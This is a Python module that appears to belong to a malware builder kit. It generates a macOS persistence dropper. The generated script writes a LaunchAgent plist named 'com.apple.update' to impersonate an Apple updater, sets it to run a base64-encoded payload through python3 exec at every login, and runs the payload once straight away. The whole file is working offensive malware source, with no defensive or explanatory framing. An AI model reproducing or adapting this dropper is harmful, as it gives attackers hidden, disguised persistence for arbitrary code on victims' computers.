# builder/blocks/persistence/mac_launch_agent.macos.python.persistence.default.py

"""
Wrap payload in a simple macOS LaunchAgent plist dropper.
"""

import textwrap, plistlib, base64, os, tempfile

METADATA = {
    "name":     "mac_launch_agent",
    "platform": "macos",
    "language": "python",
    "category": "persistence",
    "variant":  "default",
    "args":     ["payload_code"],
    "returns":  "str",
}

def generate(payload_code: str, **spec) -> str:
    # Encode payload so we can drop & exec it
    b64 = base64.b64encode(payload_code.encode()).decode()
    plist = plistlib.dumps({
        "Label": "com.apple.update",
        "ProgramArguments": ["/usr/bin/python3", "-c", f"import base64,os;exec(base64.b64decode('{b64}'))"],
        "RunAtLoad": True
    }).decode()

    return textwrap.dedent(f"""
        import plistlib, base64, os, tempfile
        payload_b64 = "{b64}"
        agent_plist = {plist!r}

        # Write LaunchAgent
        launch_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.update.plist")
        with open(launch_path, "wb") as f:
            f.write(agent_plist.encode())

        # Execute payload once now
        exec(base64.b64decode(payload_b64).decode())
    """)
